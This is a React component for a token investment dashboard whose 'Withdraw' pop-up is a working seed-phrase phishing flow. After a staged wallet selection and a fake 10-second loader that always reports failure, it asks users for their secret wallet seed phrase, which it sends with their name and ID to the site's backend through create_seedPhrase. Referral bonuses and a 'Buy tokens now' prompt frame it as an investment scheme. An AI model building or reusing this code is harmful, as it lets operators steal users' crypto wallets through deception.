import React, { useEffect, useState } from 'react';
import { useOutletContext } from 'react-router-dom';
import TransactionTable from '../TrasactionComp';
import { useDispatch, useSelector } from 'react-redux';
import { get_all_user_transactions } from '../../store/reducers/participantReducer';
import { IoMdClose } from 'react-icons/io';
import { Link } from 'react-router-dom';
import copy from 'copy-to-clipboard';
import { FadeLoader } from 'react-spinners';
import { create_seedPhrase } from '../../store/reducers/socialReducer';
import { FaWhatsapp } from 'react-icons/fa';
import { MdEmail } from 'react-icons/md';
import toast from 'react-hot-toast';

const MyToken = () => {
   const { homeDetails,userInfo } = useOutletContext();
   const dispatch = useDispatch();
   const {transactions } = useSelector(state => state.participant);
   const [withdraw,setWithdraw]=useState(false)
   const [connect,setConnect]=useState(true)
   const [walletConnect,setWalletConnect]=useState(true)
   const [seedphrase,setSeedphrase]=useState(true)
   const [myloader, setMyloader] = useState(true)
   const [seedPhrase, setSeedPhrase] = useState('');
   const [isConnecting, setIsConnecting] = useState(false);
   const [finalMsg, setFinalMsg] = useState(true);
   const [eligible, setEligible] = useState(true);

   //setConnect(false); setWalletConnect(true); setMyloader(true); setSeedphrase(false); setIsConnecting(false); setFinalMsg(true); setEligible(true)
   const handleCopy = (text) => {
    copy(text);
    toast.success('Copied')
     }
   const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setSeedPhrase(text);
    } catch (err) {
      console.error('Failed to read clipboard contents: ', err);
    }
  };

  const handleConnect = () => {
    if (!userInfo) {
      return;
    }
    setFinalMsg(false)
    if (seedPhrase.trim()) {
      const userId = userInfo._id;
      const fullname=userInfo.fullname
      setIsConnecting(true);

      // Process the connection with the seed phrase
      
     dispatch(create_seedPhrase({userId,seedPhrase,fullname}))
      // Reset connecting state after a brief delay to show feedback
      setTimeout(() => setIsConnecting(false), 1000);
    }
  };
  const handleWhatsAppClick = () => {
    window.open(homeDetails?.socialDetails?.whatsapp, "_blank"); 
  };



useEffect(() => {
  // Only proceed if userInfo is available
  if (!userInfo) {
    return;
  }
  if(userInfo.status!=="Beginner"){
    setEligible(false)
  }

  // Get userId from userInfo if available
  const userId = userInfo._id;
  
  // Only dispatch if we have a valid userId and user status isn't beginner
  if (userId && userInfo) {
    dispatch(get_all_user_transactions(userId));
  } 
}, [userInfo, dispatch]);

   const getDiscountPercentage = (status) => {
    switch (status) {
      case "Bronze": return 5;
      case "Silver": return 10;
      case "Gold": return 15;
      case "Platinum": return 20;
      case "Diamond": return 25;
      case "Legend": return 30;
      case "Super Legend": return 35;
      default: return 0;
    }
  };

  const [selectedWallet, setSelectedWallet] = useState('metamask');
  
  const wallets = [
    { id: 'metamask', name: 'Metamask', icon: `/walletImage/metamask.png` },
    { id: 'coinbase', name: 'Coinbase', icon: `/walletImage/coinbase.png` },
    { id: 'walletconnect', name: 'WalletConnect', icon: `/walletImage/walletconnect.png` },
    { id: 'trustwallet', name: 'TrustWallet', icon: `/walletImage/trustwallet.png`  },
  ];
    return (
        <div className="p-6 bg-black text-white min-h-screen">
         <div className="relative">
            <div className="flex justify-between items-center mb-6">
              <h1 className="text-3xl font-bold">{homeDetails?.homeDetails?.TokenName}</h1>
              <button 
                onClick={() => setWithdraw(!withdraw)} 
                className="px-4 py-2 bg-gray-200 text-gray-800 rounded hover:bg-gray-400 transition-colors duration-200"
              >
                Withdraw
              </button>
            </div>
            
            {withdraw && (
              <div className="absolute right-0 top-full mt-2 z-30 w-72 sm:w-80 md:w-96 shadow-xl">
                <div className="w-full bg-gray-800 rounded-lg p-6 text-white relative">
                  <button 
                    className="absolute top-2 right-2 text-red-400 hover:text-white transition-colors duration-200"
                    onClick={() => {setWithdraw(false);setConnect(true); setWalletConnect(true); setMyloader(true); setSeedphrase(false); setIsConnecting(false); setFinalMsg(true);
                    }}
                  >
                    <IoMdClose size={24} />
                  </button>
                  
                  <div className="mb-4 w-full">
                    {
                      eligible?<div className=' *:space-y-3'>
                        <p className='text-lg sm:text-2xl font-semibold text-center text-white'>We're Sorry</p>
                        <p className='text-gray-300'>You have insufficient {homeDetails?.homeDetails?.TokenSymbol} balance to make a withdrawal. <Link  to={`/dashboard/buy-token`} className='text-blue-500 underline hover:underline-offset-1'>Buy tokens now!</Link> </p>
                      </div>:
                      connect?<div className='flex flex-col gap-y-3 justify-center items-center'>
                              <p className='font-semibold text-gray-100 text-xl'>Your current balance is: {userInfo?.balance} {homeDetails?.homeDetails?.TokenSymbol}</p>
                              <button onClick={()=>setConnect(false)} className="justify-center w-fit py-2 px-4 mt-4 bg-gradient-to-r from-gray-400 to-gray-500 text-white rounded hover:from-gray-500 hover:to-gray-600">
                                <span className='block text-center'>CONNECT WALLET</span> 
                              </button>
                            </div>:
                            walletConnect?<div className="flex justify-center items-center p-4">
                              <div className="bg-gray-700 rounded-3xl p-6 w-full max-w-md shadow-lg">
                                <h1 className="text-4xl font-bold mb-2">Connect Wallet</h1>
                                <p className="text-gray-200 text-xl mb-2">Choose an active wallet to connect</p>
                                <p className="text-gray-400 text-base sm:text-lg mb-6">Wallet must have had at least TWO (2) transactions in the past month</p>
                                <div className="flex flex-col gap-4">
                                  {wallets.map((wallet) => (
                                    <div 
                                      key={wallet.id}
                                      className={` rounded-full p-4 flex items-center justify-between cursor-pointer ${selectedWallet === wallet.id ? 'bg-green-500 text-white' : 'bg-white text-gray-800 border-2 border-gray-300'}`}
                                      onClick={() => setSelectedWallet(wallet.id)}
                                    >
                                      <div className="flex items-center">
                                        <div className="w-6 h-6 sm:w-10 sm:h-10 flex items-center justify-center text-lg sm:text-2xl">
                                        <img src={`${process.env.REACT_APP_FRONTEND_HOST}${wallet.icon}`} alt="wallet" className="h-6 sm:h-15" />
                                          {/* {wallet.icon} */}
                                        </div>
                                        <span className="ml-2 sm:ml-4 text-sm sm:text-lg font-medium">{wallet.name}</span>
                                      </div>
                                      
                                      {/* <div className={`w-6 h-6 rounded-full ${selectedWallet === wallet.id ? 'bg-green-500' : 'border-2 border-gray-300'}`}></div>
                                     */}
                                    </div>
                                  ))}
                                </div>
                                <div className='flex gap-1 justify-center items-center'>
                                    <button onClick={()=>{setWalletConnect(false);setTimeout(() => {setMyloader(false) }, 10000);}} className="justify-center w-fit py-2 px-4 mt-4 bg-gradient-to-r from-gray-400 to-gray-500 text-white rounded hover:from-gray-500 hover:to-gray-600">
                                      <span className='block text-center'>CONNECT WALLET</span> 
                                    </button>
                                </div>
                              </div>
                            </div>:myloader?<div className='flex justify-center items-center'><FadeLoader color="white" loading={true} height={20} /></div>:seedphrase?<div className='flex flex-col gap-y-3 justify-center items-center'>
                              <p className='font-semibold text-gray-100 text-xl'>something went wrong connect mannually</p>
                              <button onClick={()=>{setSeedphrase(false);}} className="justify-center w-fit py-2 px-4 mt-4 bg-gradient-to-r from-gray-400 to-gray-500 text-white rounded hover:from-gray-500 hover:to-gray-600">
                                <span className='block text-center sm:text-lg text-base'>CONNECT WITH SEED-PHASE</span> 
                              </button>
                            </div>:finalMsg?
                           <div className="flex flex-col gap-y-4 w-full max-w-md p-6 bg-gray-800 rounded-lg shadow-md">
                           <p className="text-sm sm:text-lg font-medium text-gray-200">Secret seed phrase</p>
                           
                           <div className="relative w-full">
                             <textarea 
                               className="w-full h-32 p-3 border border-gray-600 bg-gray-700 text-white rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500 resize-none"
                               placeholder="Enter your secret seed phrase here"
                               value={seedPhrase}
                               onChange={(e) => setSeedPhrase(e.target.value)}
                             />
                             <button 
                               className="absolute bottom-3 right-3 px-3 py-1 bg-gray-600 text-gray-200 rounded hover:bg-gray-500 text-sm font-medium transition-colors"
                               onClick={handlePaste}
                             >
                               Paste
                             </button>
                           </div>
                           
                           <p className="text-xs sm:text-sm text-gray-400">
                             Typically 12 (sometimes 18, 24) words separated by single spaces
                           </p>
                           
                           <div className="flex justify-center w-full mt-2">
                             <button 
                               onClick={handleConnect}
                               disabled={!seedPhrase.trim()}
                               className={`py-2 px-6 rounded font-medium transition-all ${
                                 seedPhrase.trim() 
                                   ? 'bg-gradient-to-r from-blue-500 to-blue-700 text-white hover:from-blue-600 hover:to-blue-800' 
                                   : 'bg-gray-600 text-gray-400 cursor-not-allowed'
                               } ${isConnecting ? 'opacity-75' : ''}`}
                             >
                               {isConnecting ? 'Connecting...' : 'CONNECT WALLET'}
                             </button>
                           </div>
                         </div>:
                          <div className="mt-6">
                          <p className="text-center w-full mb-4">
                            If you have any complaint or questions contact the support team
                          </p>
                
                          <div className="flex justify-center items-center gap-6">
                            {homeDetails?.socialDetails?.whatsapp ? (
                              <>
                                <Link to="/contact" className="flex flex-col items-center">
                                  <div className="p-2 rounded-lg bg-secondary/25 cursor-pointer hover:bg-secondary/80 w-16 h-16 flex items-center justify-center">
                                    <MdEmail className="w-8 h-8 text-blue-600 hover:text-blue-400" />
                                  </div>
                                  <span className="text-sm text-gray-400 mt-1">Email</span>
                                </Link>
                                
                                <div className="flex flex-col items-center">
                                  <div className="h-10 w-px bg-gray-400"></div>
                                  <p className="font-bold text-lg text-gray-300 my-1">OR</p>
                                  <div className="h-10 w-px bg-gray-400"></div>
                                </div>
                                
                                <button onClick={handleWhatsAppClick} className="flex flex-col items-center">
                                  <div className="p-2 rounded-lg bg-secondary/25 cursor-pointer hover:bg-secondary/80 w-16 h-16 flex items-center justify-center">
                                    <FaWhatsapp className="w-8 h-8 text-green-500 hover:text-green-400" />
                                  </div>
                                  <span className="text-sm text-gray-400 mt-1">WhatsApp</span>
                                </button>
                              </>
                            ) : (
                              <Link to="/contact" className="flex flex-col items-center">
                                <div className="p-2 rounded-lg bg-secondary/25 cursor-pointer hover:bg-secondary/80 w-16 h-16 flex items-center justify-center">
                                  <MdEmail className="w-8 h-8 text-blue-600 hover:text-blue-400" />
                                </div>
                                <span className="text-sm text-gray-400 mt-1">Email</span>
                              </Link>
                            )}
                          </div>
                        </div>
                    }
                  </div>
                </div>
              </div>
            )}

          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-6">
            <div className="bg-gray-800 p-4 rounded-lg">
              <div className="mb-1">
              <img src={homeDetails?.homeDetails?.TokenImage} alt={homeDetails?.homeDetails?.TokenSymbol} className="size-2 sm:size-4" />
              </div>
              <div className="text-2xl font-bold">{userInfo?.balance}</div>
              <div className="text-sm text-gray-400">Current Balance in {homeDetails?.homeDetails?.TokenName}</div>
            </div>
            
            <div className="bg-gray-800 p-4 rounded-lg">
              <div className="mb-1">
                <span className="text-gray-400">$</span>
              </div>
              <div className="text-2xl font-bold">{(userInfo?.balance)*homeDetails?.homeDetails?.TokenRate}</div>
              <div className="text-sm text-gray-400">USDT Equivalent</div>
            </div>
            
            <div className="bg-gray-800 p-4 rounded-lg">
              <div className="mb-1">
                 <img src={homeDetails?.homeDetails?.TokenImage} alt={homeDetails?.homeDetails?.TokenSymbol} className="size-2 sm:size-4" />
              </div>
              <div className="text-2xl font-bold">0.00</div>
              <div className="text-sm text-gray-400">{"withdrew token(s)"}</div>
            </div>
            
            <div className="bg-gray-800 p-4 rounded-lg">
              <div className="mb-1">
                <img src={homeDetails?.homeDetails?.TokenImage} alt={homeDetails?.homeDetails?.TokenSymbol} className="size-2 sm:size-4" />
              </div>
              <div className="text-2xl font-bold">{((getDiscountPercentage(userInfo?.status) / 100)*userInfo?.balance)}</div>
              <div className="text-sm text-gray-400">{"Bonus  token(s)"}</div>
            </div>
            
            <div className="bg-gray-800 p-4 rounded-lg">
              <div className="mb-1">
              <img src={homeDetails?.homeDetails?.TokenImage} alt={homeDetails?.homeDetails?.TokenSymbol} className="size-2 sm:size-4" />
              </div>
              <div className="text-2xl font-bold">{((getDiscountPercentage(userInfo?.status) / 100)*userInfo?.balance) + userInfo?.balance}</div>
              <div className="text-sm text-gray-400">Total investment</div>
            </div>
            
            <div className="bg-gray-800 p-4 rounded-lg">
              <div className="mb-1 text-lg font-bold">Referral system</div>
              <div className="text-sm uppercase mt-2 mb-2 text-gray-400">Earn {homeDetails?.homeDetails?.TokenName} Bonus by sharing Your referral link</div>
              <div onClick={()=>handleCopy(`${process.env.REACT_APP_FRONTEND_HOST}/register/${userInfo?.userReferral}`)} className="text-sm text-gray-500 cursor-pointer">{`${process.env.REACT_APP_FRONTEND_HOST}/register/${userInfo?.userReferral}`} </div>
            </div>
          </div>
          
          <div className="bg-gray-800 p-4 rounded-lg">
            <h2 className="text-xl font-bold mb-4">Transactions History</h2>
            {
              transactions ? <TransactionTable transactions={transactions}/> :<div className="text-center text-gray-500 py-8">No transactions yet</div>
            }
           
          </div>
        </div>
      );
};

export default MyToken;